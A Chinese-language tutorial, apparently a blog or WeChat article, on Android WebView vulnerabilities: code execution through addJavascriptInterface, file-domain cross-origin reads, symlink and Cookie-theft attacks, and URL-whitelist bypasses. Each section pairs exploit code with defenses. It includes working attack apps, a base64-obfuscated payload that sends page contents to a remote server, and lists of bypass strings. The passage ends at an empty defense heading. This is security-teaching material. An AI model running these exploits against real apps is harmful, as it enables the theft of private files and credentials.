##   
```
```  
  
##   
### 1.历史漏洞  
  
****#### （1）WebView任意代码执行漏洞  
##### <1> addJavascriptInterface 接口引起远程代码执行漏洞  
  
漏洞原理：  
  
   
  
我们在上文中讲述过JS和Android直接的通信可以通过addJavascriptInterface接口进行对象映射  
```
webView.addJavascriptInterface(new JSObject(), "myObj");
// 参数1：Android的本地对象
// 参数2：JS的对象
// 通过对象映射将Android中的本地对象和JS中的对象进行关联，从而实现JS调用Android的对象和方法
```  
  
  
当JS拿到Android这个对象后，就可以调用这个Android对象中所有的方法，包括系统类（java.lang.Runtime 类），从而进行任意代码执行。  
  
   
  
具体的攻击步骤：  
```
（1）Android中的对象有一公共的方法：getClass()
（2）该方法可以获取到当前类 类型Class
（3）该类有一关键的方法：Class.forName；
（4）该方法可以加载一个类（可加载 java.lang.Runtime 类）
（5）而该类是可以执行本地命令的
```  
  
  
示例代码：  
```
function execute(cmdArgs) 
{ 
    // 步骤1：遍历 window 对象
    // 目的是为了找到包含 getClass （）的对象
    // 因为Android映射的JS对象也在window中，所以肯定会遍历到
    for (var obj in window) { 
        if ("getClass" in window[obj]) { 

      // 步骤2：利用反射调用forName（）得到Runtime类对象
            alert(obj);         
            return  window[obj].getClass().forName("java.lang.Runtime") 

      // 步骤3：以后，就可以调用静态方法来执行一些命令，比如访问文件的命令
getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); 

// 从执行命令后返回的输入流中得到字符串，有很严重暴露隐私的危险。
// 如执行完访问文件的命令之后，就可以得到文件名的信息了。
        } 
    } 
}
```  
  
  
漏洞防护：  
  
Google在Android4.2以后对调用的函数以@JavascriptInterface进行注解从而避免漏洞攻击，也就是说我们js调用Android的方法，必须要在JavascriptInterface中进行声明，这样才能调用，如我们上文中实现的便是如此。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiak0o8F8UMh02Wa6Qtx47efGHEaoCWtMlvib6LN1cbPh6clnnHE7ic4e3WQ/640?wx_fmt=png "")  
  
后来这种漏洞越来越少，在当前高版本的手机上基本没有了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakkwuEsWAjchvB6co2Yzvn2KxazzX3kwgIabeB5FeuPZSSLs4wIN9nVA/640?wx_fmt=png "")  
  
   
  
在4.2之前，可以采用拦截prompt（）的方式进行漏洞修复，不过这种版本太过久远，所以我们这里就不细讲了。  
  
##### <2>searchBoxJavaBridge_接口引起远程代码执行漏洞  
  
  
漏洞原理：  
  
在Android 3.0以下，Android系统会默认通过searchBoxJavaBridge_的Js接口给 WebView 添加一个JS映射对象：searchBoxJavaBridge_对象，该接口可能被利用，实现远程任意代码。  
  
   
  
安全防护：  
  
删除searchBoxJavaBridge_接口  
```
// 通过调用该方法删除接口
removeJavascriptInterface（）;
```  
  
  
而accessibility和 accessibilityTraversal接口引起远程代码执行漏洞的原理和这里相似，由于这些漏洞在当前的Android版本上基本不存在，我们不做深入讲解了。  
  
#### （2）WebView明文存储漏洞  
  
  
漏洞原理：  
  
WebView默认开启密码保存功能 ：  
```

mWebView.setSavePassword(true)`
```  
  
  
  
开启后，在用户输入密码时，会弹出提示框：询问用户是否保存密码；  
  
   
  
如果选择”是”，密码会被明文保到 /data/data/com.package.name/databases/webview.db 中，这样就有被盗取密码的危险  
  
   
  
安全防护：  
  
通过 WebSettings.setSavePassword(false) 关闭密码保存提醒功能，防止明文密码存在本地被盗用。  
###   
### 2.跨域漏洞  
  
****  
2018 年国家信息安全漏洞共享平台（CNVD）发布关于Android平台 WebView 控件存在跨域访问高危漏洞的安全公告 (CNVD-2017-36682)，漏洞产生的原因在Android系统中，WebView 开启了 file 域访问，且允许 file 域对 http 域进行访问，同时未对 file 域的路径进行严格限制所致。攻击者通过 URL Scheme 的方式，可远程打开并加载恶意 HTML 文件，远程获取 APP 中包括用户登录凭证在内的所有本地敏感数据。  
  
   
  
针对WebView的跨域问题，主要是三个重要的API，如下所示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakKICy4O3lCSwHLKKF4Xzlics6bh753Tu0tf60cbrOsgUHgB5Zq0ecXpw/640?wx_fmt=png "")  
  
#### （1）任意文件窃取1（应用克隆漏洞）  
  
  
漏洞原理：  
  
setAllowFileAccess(true) + setAllowFileAccessFromFileURLs(true)  
  
   
  
这样使得WebView可以使用File协议，和加载Js代码读取本地文件，或访问http源，这样会导致攻击者操作用户点击后无感知下载恶意的HTML/JS，并窃取相关的私有文件信息  
  
   
  
漏洞复现：  
  
首先我们可以查询Android手机中的/etc/hosts私有文件信息  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakaWKWSchPwia67paZNCrjXDKEasxAic7ibhRQ40TXPnMfx2NvxlHgnDX4g/640?wx_fmt=png "")  
  
我们怎么利用WebView的跨域漏洞去访问本地的私有目录  
  
   
  
首先我们编写目标JS文件：  
  
fileAttack.html  
```
<script>
function loadXMLDoc()
{
    var arm = "file:///etc/hosts";
    var xmlhttp;
    if (window.XMLHttpRequest)
    {
        xmlhttp=new XMLHttpRequest();
    }
    xmlhttp.onreadystatechange=function()
{
        //alert("status is"+xmlhttp.status);
        if (xmlhttp.readyState==4)
        {
              console.log(xmlhttp.responseText);
        }
    }
    xmlhttp.open("GET",arm);
    xmlhttp.send(null);
}
loadXMLDoc();
</script>
```  
  
  
然后我们将文件上传到手机的目录：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiak0JccNLZWaMqmsev7pib0Mflkco1pVDe8mUCxo4iawaXETIs4fj2jGA5A/640?wx_fmt=png "")  
  
接着我们编写攻击脚本  
```
@Override
  protected void onCreate(Bundle savedInstanceState) {
      super.onCreate(savedInstanceState);
      setContentView(R.layout.activity_file_web_view);
      WebView webView = findViewById(R.id.Wind_webview0);
      //设置是否允许 WebView 使用 File 协议
      webView.getSettings().setAllowFileAccess(true);


      //设置是否允许 WebView 使用 JavaScript
      webView.getSettings().setJavaScriptEnabled(true);

      webView.loadUrl("file:///data/local/tmp/fileAttack.html");

  }
```  
  
  
这  
是程序肯定会报错误，因为Android4.1后就默认禁止setAllowFileAccessFromFileURLs(true)  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakYUu3bqTcviaOreEEKdX5H9vibsibY8ok23z3uRaHasgTI77MXLk7Y1syw/640?wx_fmt=png "")  
  
然后我们开启setAllowFileAccessFromFileURLs按钮，再次执行。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiak4iaQt10tEvS19ZibiaX4abgLN5APicMiapbDVVpU8T3115UjcsgccOQ0lUQ/640?wx_fmt=png "")  
  
我们可以发现现在的Android版本中开始删除了这样的API，这是为了安全性，不过这里我们还是可以使用，于是我们开启API。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakTerysMeUudtHPAWeUrYZwIBbOC5OXx5KJ8BPwowvFkiag8viavJibr2uQ/640?wx_fmt=png "")  
  
这里就获取了相应的私有文件信息，而且加载了我们的恶意html文件  
####   
#### （2）通用协议漏洞 （恶意页面注入）  
  
  
漏洞原理：  
  
setAllowFileAccess(true) + setAllowUniversalAccessFromFileURLs(true)  
  
   
  
用同样的方式测试 setAllowUniversalAccessFromFileURLs 的值，当 setAllowUniversalAccessFromFileURLs 的值为 true 时，可以利用 js 来访问恶意网站（HTTP 或 HTTPS）的链接。  
  
   
  
我们将上面html中的访问改为看雪的网站：  
```
<script>
function loadXMLDoc()
{
    var arm = "https://bbs.pediy.com/";
    var xmlhttp;
    if (window.XMLHttpRequest)
    {
        xmlhttp=new XMLHttpRequest();
    }
    xmlhttp.onreadystatechange=function()
{
        //alert("status is"+xmlhttp.status);
        if (xmlhttp.readyState==4)
        {
              console.log(xmlhttp.responseText);
        }
    }
    xmlhttp.open("GET",arm);
    xmlhttp.send(null);
}
loadXMLDoc();
</script>
```  
  
  
然后开启setAllowUniversalAccessFromFileURLs 函数API，并运行。  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakJyiabl8XjOkJXgqCeh0ROiajhWVrPViby0kRF8XRPBLzB00SmyUjLUWvA/640?wx_fmt=png "")  
  
   
  
我们可以发现这里我们注入html后还可以去访问网站，这样我们可以在脚本中使其访问恶意的网站界面，并返回这样就可以进行恶意界面的注入  
  
   
  
安全防护:  
- 检查应用是否使用了 webview 控件；  
  
- 避免 App 内部的 WebView 被不信任的第三方调用，排查内置 WebView 的 Activity 是否被导出、必须导出的 Activity 是否会通过参数传递调起内置的WebView等；  
  
- file 域访问为非功能需求时，手动配置 setAllowFileAccessFromFileURLs 或 setAllowUniversalAccessFromFileURLs 两个 API 为 false（Android 4.1 版本之前这两个 API 默认是 true，需要显式设置为 false）；  
  
若需要开启 file 域访问，则设置 file 路径的白名单，严格控制 file 域的访问范围，具体如下：  
- 固定不变的 HTML 文件可以放在 assets 或 res 目录下，file:///android_asset 和 file:///android_res 在不开启 API 的情况下也可以访问；  
  
- 可能会更新的 HTML 文件放在 /data/data/(app) 目录下，避免被第三方替换或修改；  
  
- 对 file 域请求做白名单限制时，需要对“…/…/”特殊情况进行处理，避免白名单被绕过。  
  
####   
  
#### （3）符号链接跨源攻击  
  
  
我们回顾2020SDC中研究提到的这类漏洞，只有setAllowFileAccess为True。  
  
   
  
漏洞原理：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakBcBHw83QY98l76ALuEdibZfYfgsibziabVE44Evr2eWeaEY41ge9ia7Pyg/640?wx_fmt=png "")  
  
其攻击过程首先是操纵WebView去访问一个攻击APP自己公开出来的网页，然后这个网页执行的内容其实就是延时去读取自身。在延时读取自身的时间窗口内，这个文件悄悄被进行了替换，替换成了软链接，指向受害APP的一个私有文件，最终读取窃取其内容。  
  
   
  
具体攻击步骤:  
```
（在该命令执行前 xx.html 是不存在的；执行完这条命令之后，就生成了这个文件，并且将 Cookie 文件链接到了 xx.html 上。）
1. 把恶意的 js 代码输出到攻击应用的目录下，随机命名为 xx.html，修改该目录的权限；\
2. 修改后休眠 1s，让文件操作完成；\
3. 完成后通过系统的 Chrome 应用去打开该 xx.html 文件\
4. 等待 4s 让 Chrome 加载完成该 html，最后将该 html 删除，并且使用 ln -s 命令为 Chrome 的 Cookie 文件创建软连接，\
于是就可通过链接来访问 Chrome 的 Cookie
```  
  
  
漏洞复现：  
  
这里由于该漏洞在Android7.0版本上已经修复了，所以这里我引用大佬的博客来进行描述，大家具体可以按照步骤在Android7.0以下的版本上去复现，参考文章：Android安全检测－WebView File域同源策略绕过漏洞https://blog.csdn.net/qq_35993502/article/details/121371049（）  
  
   
  
构造HTML文件：  
```
#恶意APP的HTML,被检测APP加载此html，执行JS代码
<html>
<body></body>
<script>
var d = document;
function loadDatabase()
{
    var file_url = d.URL;
    var xmlhttp =new XMLHttpRequest();
    xmlhttp.onload=function() {
         document.body.appendChild(d.createTextNode(xmlhttp.responseText))
        alert(xmlhttp.responseText);
    }
    xmlhttp.open("GET",file_url);
    xmlhttp.send(null);
}
setTimeout(loadDatabase(),8000); #延迟8秒执行。利用时间差和软链接来获取被攻击APP的私有文件
</script>
</html>
```  
  
  
构造恶意APP的攻击代码  
```
#恶意APP的攻击代码
  try {
          String HTML = "恶意APP的HTML,在上面的HTML代码";
          #新建文件夹，用于存放恶意HTML文件
           cmdexec("mkdir /data/data/mm.xxxxx.testdemo3/files");
           #将恶意HTML到恶意APP的沙盒目录
        cmdexec("echo \"" + HTML + "\" >  /data/data/mm.xxxxx.testdemo3/files/attack.html");
        #授权目录及其文件权限，允许其它应用访问
        cmdexec("chmod -R 777 /data/data/mm.xxxxx.testdemo3/files");
        Thread.sleep(1000);
        #启动被攻击的APP，并携带恶意HTML
        invokeVulnAPP("file://" + HTML_PATH);
        #延时6秒
        Thread.sleep(6000);
        #删除HTML文件
        cmdexec("rm " + HTML_PATH);
        #软链接文件，实现读取被攻击应用的private.txt文件
        cmdexec("ln -s " + "/data/data/mm.xxxxx.testdemo3/files/private.txt" + " " + HTML_PATH);
  } catch (Exception e) {
      // TODO: handle exception
  }
```  
  
  
目标样本：  
```
#被攻击的APP，有漏洞的代码
WebView webView = findViewById(R.id.webview);
webView.getSettings().setJavaScriptEnabled(true);
webView.getSettings().setAllowFileAccess(true);  允许加载File域

Intent i = getIntent();
if (i != null) {
     mUri = i.getData(); #取出了恶意HTML
}
if (mUri != null) {
    url = mUri.toString();
}
if (url != null) {
    webView.loadUrl(url); #加载了恶意HTML
}
```  
  
  
实现效果：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiak9dia3HeVVnAz3QlwJiclgniagAZUniaTC8m9DrhfW2RpwxWgNFSiaL7v8Jw/640?wx_fmt=png "")  
  
   
  
安全防护：  
```
1、设置setAllowFileAccess方法为false,设置setAllowFileAccessFromFileURLs和setAllowUniversalAccessFromFileURLs为false。
2、在Android4.0(API15)及以下得采用其他方法进行手动校验是否访问file域
3、当WebView所在Activity存在组件暴露时，若不是必要的组件暴露，应该禁止组件暴露
```  
  
####   
#### （4）污染Cooike漏洞  
  
  
本漏洞参考：Android-Webview中的漏洞利用总结（http://www.ctfiot.com/39656.html）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiak9f9tpZtfA4tbkxp1wzpGFyzowDhCTSqyTibF8Z1Eus645DbxcmHFkUw/640?wx_fmt=png "")  
  
   
  
漏洞原理：  
   
  
攻击者创造符号链接，然后绕过校验，访问攻击的html，再通过软链接去加载symlink.html，然后窃取Cooike，如下图所示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakM3MBDib40DsRmQiaOX10YmKPoCZNy81R1PxrtKqB5ttw9cSpjOPX4Dbg/640?wx_fmt=png "")  
  
   
  
漏洞复现：  
  
首先创建了符号链接，然后过URL校验，访问我们的服务器http://ip地址/easydroid.html:  
  
   
  
建立一个easydroid.html，它里面有两个重定向：一个是设置Cookie，一个是加载与Cookies文件符号链接后的那个html文件。  
  
   
  
easydroid.html  
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>evil</title>
</head>
<body>
<h1>injected cookie with xss</h1>
<script>
    document.cookie = "sendData = '<img src=\"evil\" onerror=\"eval(atob('dmFyIGJhc2VVcmwgPSAiaHR0cDovLzEwLjcuODkuMTA4L015VGVzdC9SZWNlaXZlU2VydmxldD8iCm5ldyBJbWFnZSgpLnNyYyA9IGJhc2VVcmwgKyAiY29va2llPSIgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImh0bWwiKVswXS5pbm5lckhUTUwpOw=='))\">'"
    var baseUrl = "http://****/MyTest/ReceiveServlet?"
    new Image().src = baseUrl + "cookie=" + encodeURIComponent("open evil page.");
     setTimeout(function() {
         location.href = 'intent:#Intent;component=com.bytectf.easydroid/.TestActivity;S.url=file%3A%2Fdata%2Fuser%2F0%2Fcom.bytectf.pwneasydroid%2Fsymlink.html;end';
     }, 40000);
</script>
</body>
</html>
```  
  
  
攻击代码：  
```
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
    symlink();
    Intent intent \= new Intent();
    intent.setClassName("com.bytectf.easydroid","com.bytectf.easydroid.MainActivity");
    intent.setData(Uri.parse("http://toutiao.com@****/easydroid.html"));
    startActivity(intent);
}


private String symlink() {
try {
    String root \= getApplicationInfo().dataDir;
    String symlink \= root + "/symlink.html";
    String cookies \= getPackageManager().getApplicationInfo("com.bytectf.easydroid", 0).dataDir + "/app_webview/Cookies";

    Runtime.getRuntime().exec("rm " + symlink).waitFor();
    Runtime.getRuntime().exec("ln -s " + cookies + " " + symlink).waitFor();
    Runtime.getRuntime().exec("chmod -R 777 " + root).waitFor();

    return symlink;
} catch (Throwable th) {
    throw new RuntimeException(th);
}
}
```  
  
  
通过Intent重定向，首先加载exp.html来设置cookie，然后再加载symlink.html，将所要Cookies内容返回给我们的服务器。最终达到窃取Cookies的目的。注意，这里要保证setAllowFileAccess(true)，API 29以下默认为true，否则会利用失败。  
  
   
  
效果显示：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiaks3cMLIG5ZpGnicMOVM8P7MOibubeiaEQZu4MoaKQpkBgSOTGy5Kicr0vTA/640?wx_fmt=png "")  
###   
### 3.URL配置漏洞  
  
****  
在WebView漏洞中，许多URL可以通过各种方式去绕过验证，从而引起各式各样的漏洞  
  
   
  
URL的结构如下：  
```

scheme://login:password@address:port/path/to/resource/?query_string#fragment
```  
- scheme不区分大小写，包括http、https、file、ftp等等,:之后的“//”可省略，例如http:www.qq.com, 此外，多数浏览器在scheme之前加空格也是可以正常解析的  
  
- login:password@（认证信息）服务器有时候需要用户名和密码认证，ftp协议比较常见，http很少见，但这个不常见字段往往可以绕过很多检查  
  
- addressaddress字段可以是一个不区分大小写的域名、一个ipv4地址或带方括号的ipv6地址，部分浏览器接收ip地址的八进制、十进制、十六进制等写法  
  
- port端口号  
  
- /path/to/resource层级路径，可以使用“../”到上一级目录  
  
- query_string查询字符串，格式为”query_string?name1=value1&name2=value2”  
  
- fragment用于html中的页面定位  
  
####   
####   
#### （1）URL绕过漏洞  
  
  
漏洞原理：  
##### <1>通用的URL绕过  
  
首先我们来看一个简单的url校验例子：  
```
if(checkDomain(url)){
    enableJavaScriptInterface();
    //或者webview.load(url)
}
```  
  
  
这里是对url进行域名校验，然后开启我们的enableJavaScriptInterface接口可以访问js文件。  
  
   
  
我们在实际中会发现这样的例子：  
```
if(url.startsWith("file://")){
    setJavaScriptEnbled(false);
}else{
    setJavaScriptEnbled(true);
}
```  
  
  
很明显这里是开发者为了防止加载file的同源策略进行的防护，但是我们有很多的绕过方法：  
  
   
  
总结：  
```
(1) 大写字母 “File://”
(2) 前面加上空格：“ file://”
(3) 字符编码：“file：%2F/”
(4) 可正常访问的畸形路径：“file:sdcard/attack/html” 或 “file:/\//sdcard/attack.html”
```  
  
##### <2> 常见的url校验  
  
  
我们还可以发现在一般的url中会对首尾进行校验  
```
if(host.endsWith("mysite.com")){
    enableJavascriptInterface();
}
```  
  
  
存在问题：endWith未闭合点号  
```
绕过：evilmysite.com
修复：endsWith(".mysite.com")
```  
  
  
使用startsWith、contains、indexOf、正则匹配等⾮严格字符串匹配  
```
if(host.startsWith("mysite.com")){
    enableJavascriptInterface();
}
```  
  
```
  绕过：mysite.com@oppo.com
```  
  
  
contains+indexOf绕过：  
```
任何可以添加字符串的字段
子域名 huawei.com.mysite.com
子路径 mysite.com/huawei.com
参数 mysite.com/xxxx#huawei.com
```  
  
  
//和第一个/之间提取host  
```
private static boolean checkDomain(String inputUrl)
{
    String[] whiteList=new String[]{"huawei.com","hicloud.com"};
    String tempStr=inputUrl.replace("://","");
    String inputDomain=tempStr.substring(0,tempStr.indexOf("/")); //提取host
    for (String whiteDomain:whiteList)
    {
        if (inputDomain.indexOf(whiteDomain)>0)
            return true;
    }
    return  false;
}
```  
  
  
绕过方式：  
```
子域名 huawei.com.mysite.com
http://huawei.com@www.rebeyond.net/poc.htm
http://a:a@www.huawei.com:b@www.baidu.com 在android中使用getHost获取到的是huawei.com,但实际访问的是baidu.com
```  
  
  
漏洞复现：  
  
我们打开一个样本APP，分析其代码块：  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakupQEyNG5V5mosBeI4icHhlrK76foZAmEHJn80AN51aGrqBSYWwu43ibQ/640?wx_fmt=png "")  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakmvWFohGBbC0RCMYPFcwRnicWlib8QgG0ZoibBWG355ksnqib4CTrZlnWuA/640?wx_fmt=png "")  
  
   
  
这里我们可以简单的发现代码对URL的相应部分进行了校验，这样我们就可以进行构造。  
```
"insecureshop://com.insecureshop/web?url=https://www.baidu.com"
"insecureshop://com.insecureshop/webview?url=http://www.baidu.com?-insecureshopapp.com"
```  
  
  
我们构造了两条URL，然后可以绕过检验，然后我们直接启动  
```
adb shell am start -W -a android.intent.action.VIEW -d URI的值
```  
  
  
效果如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakXoO7ySic2qw4RWh8OzwAS20j1Th56ibasF7nQKhteSSLmOa48wG1p5LA/640?wx_fmt=png "")  
  
   
  
这里我们可以实现任意的URI的访问和跳转  
####   
#### （2）hearachical Uri绕过  
  
  
假设我们加载的Uri不是通过Uri.parse，而是通过外部直接获取，我们可以构造hearachical 来绕过。  
  
   
  
我们可以使用 HierarchicalUri 和 Java Reflection API 进行攻击，同样我们分析一个样本的URL验证。  
```
Uri uri = getIntent().getData();
   boolean isValidUrl = "https".equals(uri.getScheme()) && uri.getUserInfo() == null && "legitimate.com".equals(uri.getHost());
   if (isValidUrl) {
       webView.loadUrl(uri.toString(), getAuthHeaders());
   }
```  
  
  
android.net.Uri在Android上被广泛使用，但实际上它是一个抽象类。android.net.Uri$HierarchicalUri是它的子类之一。Java 反射 API 使创建能够绕过此检查的 Uri 成为可能。  
  
   
  
通过反射传入⼀个scheme、authoritiy和path，构造⼀个形式为http://legitimate.com@attacker.com的HierachicalUri实例即可绕过  
```
public class MainActivity extends Activity {
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);

            Uri uri;
            try {
                //java反射获取类引用
                Class partClass = Class.forName("android.net.Uri$Part");
                Constructor partConstructor = partClass.getDeclaredConstructors()[0];
                partConstructor.setAccessible(true);

                Class pathPartClass = Class.forName("android.net.Uri$PathPart");
                Constructor pathPartConstructor = pathPartClass.getDeclaredConstructors()[0];
                pathPartConstructor.setAccessible(true);

                Class hierarchicalUriClass = Class.forName("android.net.Uri$HierarchicalUri");
                Constructor hierarchicalUriConstructor = hierarchicalUriClass.getDeclaredConstructors()[0];
                hierarchicalUriConstructor.setAccessible(true);

                //构造HierachicalUri实例
                Object authority = partConstructor.newInstance("legitimate.com", "legitimate.com");
                Object path = pathPartConstructor.newInstance("@attacker.com", "@attacker.com");
                uri = (Uri) hierarchicalUriConstructor.newInstance("https", authority, path, null, null);
            }
            catch (Exception e) {
                throw new RuntimeException(e);
            }

            Intent intent = new Intent();
            intent.setData(uri);
            intent.setClass(this, TestActivity.class);
            startActivity(intent);
        }
    }
```  
  
  
文件TestActivity.java：  
```
public class TestActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);

         Intent intent = getIntent();
         Uri uri = intent.getData();

         Log.d("evil", "Scheme: " + uri.getScheme());
         Log.d("evil", "UserInfo: " + uri.getUserInfo());
         Log.d("evil", "Host: " + uri.getHost());
         Log.d("evil", "toString(): " + uri.toString());
     }
 }
```  
  
  
然后可以获得日志信息：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiak5z68u0PDXk3p1DNGNS9ib9l0dDusBn12pNncTpP0eMh349rg75NYsfA/640?wx_fmt=png "")  
  
   
  
漏洞防护：  
  
我们只需要让攻击的应用程序获取Uri攻击者控制的对象并专门使用该对象  
```
  Uri uri = Uri.parse(intent.getData().toString());
```  
  
  
从 API 级别 28 (Android 9) 开始，禁止使用内部接口——但这可以通过使用RestrictionBypass等工具轻松绕过。  
####   
#### （3）URL Scheme绕过  
  
  
漏洞原理：  
  
代码在进行URL校验是，检查了host，但是并未检查scheme，这样我们可以通过“javascript”进行绕过  
  
   
  
例如：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiak4H39ibCz7QOIEgHA0OQfcTYjbiaNMKwM603icktquYPJicurSOibBOomP2g/640?wx_fmt=png "")  
  
也可以通过file://www.mysite.com/sdcard/evil.html绕过，某些版本WebView可正常解析为file:///sdcard/evil.html  
  
   
  
漏洞复现  
  
我们打开一个样本：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakaDxbkN84eExruY9xQwiaXZ2UItfPLr5NM0v5J2td3pf3icg42Via1vCSg/640?wx_fmt=png "")  
  
   
然后进行构造html：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakvNW3WpLvTleiazsTaG5t0vEnHCU6d6bor1zftoEyAL3bJHptqqZ2EGg/640?wx_fmt=png "")  
  
最后就绕过了校验，实现了XSS注入：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakDhRDkCaiaibicMmqSr3XWD60XxFsemsOpTMtvn4PKcfzaZnmKb8jJabsw/640?wx_fmt=png "")  
  
安全防护：  
  
URL校验函数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakicpRyHY3BVqrTcSic3o9RvumBNicQXZywm0aSqEDZJlgia5yKqwuZX9gBw/640?wx_fmt=png "")  
  
   
  
Intent Scheme校验建议写法：  
```
1.//解析Intent Scheme URL
2. Intent intent = Intent.parseUri(uri， flags);
3.//禁止打开没有BROWSABLE标签的Activity
4. intent.addCategory ( "android.intent.category.BROWSABLE" );
5.//禁止设置intent的组件
6. intent.setComponent( nu1l);
7.//禁止设置intent的selector
8. intent.setSelector(nul1);
9.//打开intent指向的activity
10.context.startActivityIfNeeded(intent，-1);
```  
  
#### （4）服务端跳转漏洞绕过  
  
  
漏洞原理：  
   
白名单域名内的服务端出现跳转漏洞时，仍然可以通过检查，并调⽤javascriptInterface，例如我们构造一个这样的URL：  
https://www.site1.com/redirect.php?url=https://www.baidu.com  
  
  
前面的https://www.site1.com/redirect.php是我们构造的虚拟的站点，当主机访问时，打开这个URL后，服务器会返回一个302响应，然后浏览器侧会斩词请求Location中指定的URL，对于具有单点登录功能的网站，这种类型的接口很常见。  
  
   
  
然后我们就可以构造URL来绕过域名白名单：  
https://www.site1.com/redirect.php?url=http://223.****.32:8080/poc.htm  
  
  
漏洞复现：  
首先我们编写攻击的htm：  
```
<script>
    alert(window.myObj.getToken());
</script>
```  
  
  
然后我们使用文件服务器来进行模拟：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakmQQuQz0G1bITkJN2jtwLAdCycQqzQlBrruxcuWIYC94UialxrK9ow5Q/640?wx_fmt=png "")  
  
我们接着编写测试样本代码：  
```
public class URLWebView extends AppCompatActivity {
    class JsObject {
        @JavascriptInterface
        public String getToken() {
            Log.e("rebeyond","i am in getToken");
            return "{\"token\":\"1234567890abcdefg\"}";
        }
    }
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_url_web_view);

        WebView webView = (WebView) findViewById(R.id.Wind_webview4);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient());
        webView.setWebChromeClient(new WebChromeClient());
        webView.addJavascriptInterface(new JsObject(),"myObj");
        String inputUrl="https://www.site1.com/redirect.php?url=http://223.****:8080/poc.htm"; //ip地址自己写自己的
        try {
            if (checkDomain(inputUrl))
            {
                Log.e("rebeyond","i am a white domain");
                //webView.loadUrl(inputUrl);
            }
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }
    private static boolean checkDomain(String inputUrl) throws  URISyntaxException {
        if (!inputUrl.startsWith("http://")&&!inputUrl.startsWith("https://"))
        {
            return false;
        }
        String[] whiteList=new String[]{"site1.com","site2.com"};
        java.net.URI url=new java.net.URI(inputUrl);
        String inputDomain=url.getHost(); //提取host
        for (String whiteDomain:whiteList)
        {
            if (inputDomain.endsWith("."+whiteDomain)) //www.site1.com      app.site2.com
                return true;
        }
        return  false;
    }

}
```  
  
  
这里我们可以分析代码中有一个白名单的域名检测函数checkDomain，但是我们可以通过构造URL来绕过：  
https://www.site1.com/redirect.php?url=http://223.****:8080/poc.htm  
  
  
然后我们启动应用：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakB0eichlCG8s4lCVxPiajMxzr38ia88sH8JheXbLcJBiaamj6DSlLS32qKQ/640?wx_fmt=png "")  
  
   
  
我们点击白名单绕过按钮：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiaklfFsFHY0CuyecUkk0iaG3JzAc4vPRIjmZBsOiaX2vrrh5HcKZIgkWUIA/640?wx_fmt=png "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakHYSG8Pe2VpMM6w5L4K7BkPKH3WfV2FkJmMYibACVn1A0Lb1fiaWD2MVw/640?wx_fmt=png "")  
  
我们可以发现这里就成功的绕过了白名单进行跳转。  
  
   
  
安全防护：  
